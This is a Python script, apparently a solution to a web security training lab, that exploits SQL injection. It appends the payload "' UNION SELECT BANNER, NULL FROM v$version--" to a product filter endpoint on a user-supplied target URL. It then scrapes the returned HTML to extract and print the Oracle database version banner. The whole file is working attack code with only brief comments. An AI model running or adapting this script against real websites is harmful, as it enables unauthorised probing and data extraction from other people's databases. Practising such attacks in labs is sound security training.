import requests
import argparse
from urllib.parse import quote
from urllib.parse import urlparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: http://example.com)")
args = parser.parse_args()
url_input = args.url

endpoint = "filter?category=Pets"
payload = "' UNION SELECT BANNER, NULL FROM v$version--"


def parse_endpoint(url, endpoint):
    # Extract the endpoint for the target URL
    parse_url = urlparse(url)
    full_url = f"{parse_url.scheme}://{parse_url.netloc}/{endpoint}"
    encoded_url = quote(full_url, safe=':/=?')
    return encoded_url


def exploit(url, endpoint, payload):
    # Exploit the target URL to get the database banner
    endpoint = parse_endpoint(url, endpoint)
    exploit = f"{endpoint}{payload}"

    try:
        response = requests.get(exploit)
        response.raise_for_status()
        return [response.text, response.status_code]
    except requests.exceptions.ConnectionError:
        print(f"Connection error occurred\nCheck again if the host is up!!!")
        return (None, None)
    except requests.exceptions.HTTPError as http_err:
        print(f'The host responses with: "{
              http_err}"\nCheck again if the host is up!!!')
        return (None, None)


def get_db_version(reponse_content):
    # Extract the DB Banner in a proper format
    soup = BeautifulSoup(reponse_content, "html.parser")
    th_tags = soup.find_all("th")
    cleaned_items = [item.text.replace(
        '\t', ' ') for item in th_tags]
    db_name = [item for item in cleaned_items if 'Production' in item]
    return ', '.join([db_name[2], db_name[3], db_name[0], db_name[4], db_name[1]])


def main():
    print("Exploiting target...")
    print("-"*50)
    response = exploit(url_input, endpoint, payload)
    if response[1] == 200:
        db_version = get_db_version(response[0])
        print(f"Endpoint: {parse_endpoint(url_input, payload)}")
        print(f"Payload: {payload}")
        print(f"DB Banner: {db_version}")
        print("-"*50)
        print("Exploiting Success!!!")
    else:
        print("-"*50)
        print("Fail to exploit the target!!!")


if __name__ == "__main__":
    main()
